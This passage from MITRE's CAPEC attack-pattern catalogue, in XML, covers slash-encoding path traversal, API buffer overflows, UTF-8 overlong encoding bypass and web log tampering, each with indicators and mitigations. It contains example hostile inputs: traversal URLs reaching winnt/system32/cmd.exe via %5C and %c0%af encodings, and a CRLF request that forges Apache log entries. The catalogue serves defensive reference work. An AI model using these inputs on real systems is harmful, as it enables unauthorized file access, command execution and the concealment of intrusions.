               <ns0:Description>[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the "Explore" phase as a target list and looks for areas where user input is used to access resources on the target host. The adversary attempts different encodings of slash characters to bypass input filters.</ns0:Description>
               <ns0:Technique>Try both backslash and forward slash characters</ns0:Technique>
               <ns0:Technique>Try different encodings for slash characters such as %5C</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Traverse application directories] Once the adversary determines how to bypass filters that filter out slash characters, they will manipulate the user input to include slashes in order to traverse directories and access resources that are not intended for the user.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The application server accepts paths to locate resources.</ns0:Prerequisite>
            <ns0:Prerequisite>The application server does insufficient input data validation on the resource path requested by the user.</ns0:Prerequisite>
            <ns0:Prerequisite>The access right to resources are not set properly.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An adversary can try variation of the slashes characters.</ns0:Skill>
            <ns0:Skill Level="Medium">An adversary can use more sophisticated tool or script to scan a website and find a path filtering problem.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>If the first path decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.</ns0:Indicator>
            <ns0:Indicator>Traffic filtering with IDS (or proxy) can detect request with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.</ns0:Indicator>
            <ns0:Indicator>An adversary can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process. Refer to the RFCs to safely decode URL.</ns0:Mitigation>
            <ns0:Mitigation>When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.</ns0:Mitigation>
            <ns0:Mitigation>There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx)</ns0:Mitigation>
            <ns0:Mitigation>Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)</ns0:Mitigation>
            <ns0:Mitigation>Test your path decoding process against malicious input.</ns0:Mitigation>
            <ns0:Mitigation>In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the application based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:b>Attack Example: Slashes in Alternate Encodings</html:b>
               <html:p>The two following requests are equivalent on most Web servers:</html:p>
               <html:div style="margin-left:1em;" class="informative">http://target server/some_directory\..\..\..\winnt</html:div>
               <html:p>is equivalent to</html:p>
               <html:div style="margin-left:1em;" class="informative">http://target server/some_directory/../../../winnt</html:div>
               <html:p>Multiple encoding conversion problems can also be leveraged as various slashes are instantiated in URL-encoded, UTF-8, or Unicode. Consider the strings</html:p>
               <html:div style="margin-left:1em;" class="informative">http://target server/some_directory\..%5C..%5C..\winnt</html:div>
               <html:p>where %5C is equivalent to the \ character.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="180" />
            <ns0:Related_Weakness CWE_ID="181" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="73" />
            <ns0:Related_Weakness CWE_ID="22" />
            <ns0:Related_Weakness CWE_ID="185" />
            <ns0:Related_Weakness CWE_ID="200" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
            <ns0:Reference External_Reference_ID="REF-525" />
            <ns0:Reference External_Reference_ID="REF-495" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Indicators, Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow, Indicators, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="8" Name="Buffer Overflow in an API Call" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack targets libraries or shared code modules which are vulnerable to buffer overflow attacks. An adversary who has knowledge of known vulnerable libraries or shared code can easily target software that makes use of these libraries. All clients that make use of the code library thus become vulnerable by association. This has a very broad effect on security across a system, usually affecting more than one software process.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target application] The adversary, with knowledge of vulnerable libraries or shared code modules, identifies a target application or program that makes use of these.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find injection vector] The adversary attempts to use the API, and if they can they send a large amount of data to see if the buffer overflow attack really does work.</ns0:Description>
               <ns0:Technique>Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft overflow content] The adversary crafts the content to be injected based on their knowledge of the vulnerability and their desired outcome. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.</ns0:Description>
               <ns0:Technique>Create malicious shellcode that will execute when the program execution is returned to it.</ns0:Technique>
               <ns0:Technique>Use a NOP-sled in the overflow content to more easily "slide" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Overflow the buffer] Using the API as the injection vector, the adversary injects the crafted overflow content into the buffer.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target host exposes an API to the user.</ns0:Prerequisite>
            <ns0:Prerequisite>One or more API functions exposed by the target host has a buffer overflow vulnerability.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Use a language or compiler that performs automatic bounds checking.</ns0:Mitigation>
            <ns0:Mitigation>Use secure functions not vulnerable to buffer overflow.</ns0:Mitigation>
            <ns0:Mitigation>If you have to use dangerous functions, make sure that you do boundary checking.</ns0:Mitigation>
            <ns0:Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Use OS-level preventative functionality. Not a complete solution.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:b>Attack Example: Libc in FreeBSD</html:b>
               <html:p>A buffer overflow in the FreeBSD utility setlocale (found in the libc module) puts many programs at risk all at once.</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:b>Xtlib</html:b>
               <html:p>A buffer overflow in the Xt library of the X windowing system allows local users to execute commands with root privileges.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="119" />
            <ns0:Related_Weakness CWE_ID="118" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="733" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="80" Name="Using UTF-8 Encoding to Bypass Validation Logic" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack is a specific variation on leveraging alternate encodings to bypass validation logic. This attack leverages the possibility to encode potentially harmful input in UTF-8 and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult. UTF-8 (8-bit UCS/Unicode Transformation Format) is a variable-length character encoding for Unicode. Legal UTF-8 characters are one to four bytes long. However, early version of the UTF-8 specification got some entries wrong (in some cases it permitted overlong characters). UTF-8 encoders are supposed to use the "shortest possible" encoding, but naive decoders may accept encodings that are longer than necessary. According to the RFC 3629, a particularly subtle form of this attack can be carried out against a parser which performs security-critical validity checks against the UTF-8 encoded form of its input, but interprets certain illegal octet sequences as characters.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="64" />
            <ns0:Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="71" />
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various UTF-8 encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.</ns0:Description>
               <ns0:Technique>Try to use UTF-8 encoding of content in Scripts in order to bypass validation routines.</ns0:Technique>
               <ns0:Technique>Try to use UTF-8 encoding of content in HTML in order to bypass validation routines.</ns0:Technique>
               <ns0:Technique>Try to use UTF-8 encoding of content in CSS in order to bypass validation routines.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The application's UTF-8 decoder accepts and interprets illegal UTF-8 characters or non-shortest format of UTF-8 encoding.</ns0:Prerequisite>
            <ns0:Prerequisite>Input filtering and validating is not done properly leaving the door open to harmful characters for the target host.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An attacker can inject different representation of a filtered character in UTF-8 format.</ns0:Skill>
            <ns0:Skill Level="Medium">An attacker may craft subtle encoding of input data by using the knowledge that they have gathered about the target host.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>A web page that contains overly long UTF-8 codes constitute a protocol anomaly, and could be an indication that an attacker is attempting to exploit a vulnerability on the target host.</ns0:Indicator>
            <ns0:Indicator>An attacker can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.</ns0:Indicator>
            <ns0:Indicator>An IDS filtering network traffic may be able to detect illegal UTF-8 characters.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>The Unicode Consortium recognized multiple representations to be a problem and has revised the Unicode Standard to make multiple representations of the same code point with UTF-8 illegal. The UTF-8 Corrigendum lists the newly restricted UTF-8 range (See references). Many current applications may not have been revised to follow this rule. Verify that your application conform to the latest UTF-8 encoding specification. Pay extra attention to the filtering of illegal characters.</ns0:Mitigation>
            <ns0:Mitigation>
               <html:p>The exact response required from an UTF-8 decoder on invalid input is not uniformly defined by the standards. In general, there are several ways a UTF-8 decoder might behave in the event of an invalid byte sequence:</html:p>
               <html:ul>
                  <html:li>1. Insert a replacement character (e.g. '?', '').</html:li>
                  <html:li>2. Ignore the bytes.</html:li>
                  <html:li>3. Interpret the bytes according to a different character encoding (often the ISO-8859-1 character map).</html:li>
                  <html:li>4. Not notice and decode as if the bytes were some similar bit of UTF-8.</html:li>
                  <html:li>5. Stop decoding and report an error (possibly giving the caller the option to continue).</html:li>
               </html:ul>
               <html:p>It is possible for a decoder to behave in different ways for different types of invalid input.</html:p>
               <html:p>RFC 3629 only requires that UTF-8 decoders must not decode "overlong sequences" (where a character is encoded in more bytes than needed but still adheres to the forms above). The Unicode Standard requires a Unicode-compliant decoder to "...treat any ill-formed code unit sequence as an error condition. This guarantees that it will neither interpret nor emit an ill-formed code unit sequence."</html:p>
               <html:p>Overlong forms are one of the most troublesome types of UTF-8 data. The current RFC says they must not be decoded but older specifications for UTF-8 only gave a warning and many simpler decoders will happily decode them. Overlong forms have been used to bypass security validations in high profile products including Microsoft's IIS web server. Therefore, great care must be taken to avoid security issues if validation is performed before conversion from UTF-8, and it is generally much simpler to handle overlong forms before any input validation is done.</html:p>
               <html:p>To maintain security in the case of invalid input, there are two options. The first is to decode the UTF-8 before doing any input validation checks. The second is to use a decoder that, in the event of invalid input, returns either an error or text that the application considers to be harmless. Another possibility is to avoid conversion out of UTF-8 altogether but this relies on any other software that the data is passed to safely handling the invalid data.</html:p>
               <html:p>Another consideration is error recovery. To guarantee correct recovery after corrupt or lost bytes, decoders must be able to recognize the difference between lead and trail bytes, rather than just assuming that bytes will be of the type allowed in their position.</html:p>
            </ns0:Mitigation>
            <ns0:Mitigation>For security reasons, a UTF-8 decoder must not accept UTF-8 sequences that are longer than necessary to encode a character. If you use a parser to decode the UTF-8 encoding, make sure that parser filter the invalid UTF-8 characters (invalid forms or overlong forms).</ns0:Mitigation>
            <ns0:Mitigation>Look for overlong UTF-8 sequences starting with malicious pattern. You can also use a UTF-8 decoder stress test to test your UTF-8 parser (See Markus Kuhn's UTF-8 and Unicode FAQ in reference section)</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Perhaps the most famous UTF-8 attack was against unpatched Microsoft Internet Information Server (IIS) 4 and IIS 5 servers. If an attacker made a request that looked like this</html:p>
               <html:div style="margin-left:1em;" class="attack">http://servername/scripts/..%c0%af../winnt/system32/ cmd.exe</html:div>
               <html:p>the server didn't correctly handle %c0%af in the URL. What do you think %c0%af means? It's 11000000 10101111 in binary; and if it's broken up using the UTF-8 mapping rules, we get this: 11000000 10101111. Therefore, the character is 00000101111, or 0x2F, the slash (/) character! The %c0%af is an invalid UTF-8 representation of the / character. Such an invalid UTF-8 escape is often referred to as an overlong sequence.</html:p>
               <html:p>So when the attacker requested the tainted URL, they accessed</html:p>
               <html:div style="margin-left:1em;" class="result">http://servername/scripts/../../winnt/system32/cmd.exe</html:div>
               <html:p>In other words, they walked out of the script's virtual directory, which is marked to allow program execution, up to the root and down into the system32 directory, where they could pass commands to the command shell, Cmd.exe.</html:p>See also: CVE-2000-0884</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="180" />
            <ns0:Related_Weakness CWE_ID="181" />
            <ns0:Related_Weakness CWE_ID="73" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="692" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
            <ns0:Reference External_Reference_ID="REF-112" Section="5.9. Character Encoding" />
            <ns0:Reference External_Reference_ID="REF-530" Section="Chapter 12" />
            <ns0:Reference External_Reference_ID="REF-531" />
            <ns0:Reference External_Reference_ID="REF-532" Section="UTF-8" />
            <ns0:Reference External_Reference_ID="REF-533" />
            <ns0:Reference External_Reference_ID="REF-114" />
            <ns0:Reference External_Reference_ID="REF-535" />
            <ns0:Reference External_Reference_ID="REF-525" />
            <ns0:Reference External_Reference_ID="REF-537" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Execution_Flow, Mitigations, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="81" Name="Web Server Logs Tampering" Abstraction="Detailed" Status="Draft">
         <ns0:Description>Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to "Log Injection-Tampering-Forging" except that in this case, the attack is targeting the logs of the web server and not the application.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="268" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine Application Web Server Log File Format] The attacker observes the system and looks for indicators of which logging utility is being used by the web server.</ns0:Description>
               <ns0:Technique>Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Determine Injectable Content] The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.</ns0:Description>
               <ns0:Technique>Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.</ns0:Description>
               <ns0:Technique>
                  <html:p>Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.</html:p>
                  <html:p>For example: The HTTP request for "/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] "GET /forged-path HTTP/1.1" 200 - "-" USER_AGENT" may add the log line into Apache "access_log" (for example). Different applications may require different encodings of the carriage return and line feed characters.</html:p>
               </ns0:Technique>
               <ns0:Technique>
                  <html:p>Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.</html:p>
                  <html:p>For example: The HTTP request for "/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] "GET /forged-path HTTP/1.1" 200 - "-" USER_AGENT" may add the log line into Apache "access_log" (for example). Different applications may require different encodings of the carriage return and line feed characters.</html:p>
               </ns0:Technique>
               <ns0:Technique>Directly through log file or database manipulation, modify existing log entries.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Target server software must be a HTTP server that performs web logging.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To input faked entries into Web logs</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Ability to send specially formatted HTTP request to web server</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Use input validation before writing to web log</ns0:Mitigation>
            <ns0:Mitigation>Design: Validate all log data before it is output</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Most web servers have a public interface, even if the majority of the site is password protected, there is usually at least a login site and brochureware that is publicly available. HTTP requests to the site are also generally logged to a Web log. From an attacker point of view, standard HTTP requests containing a malicious payload can be sent to the public website (with no other access required), when those requests appear in the log (such as http://victimsite/index.html?&lt; malicious script&gt; if they are followed by an administrator this may be sufficient to probe the administrator's host or local network.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="117" />
            <ns0:Related_Weakness CWE_ID="93" />
            <ns0:Related_Weakness CWE_ID="75" />
            <ns0:Related_Weakness CWE_ID="221" />
            <ns0:Related_Weakness CWE_ID="96" />
            <ns0:Related_Weakness CWE_ID="20" />
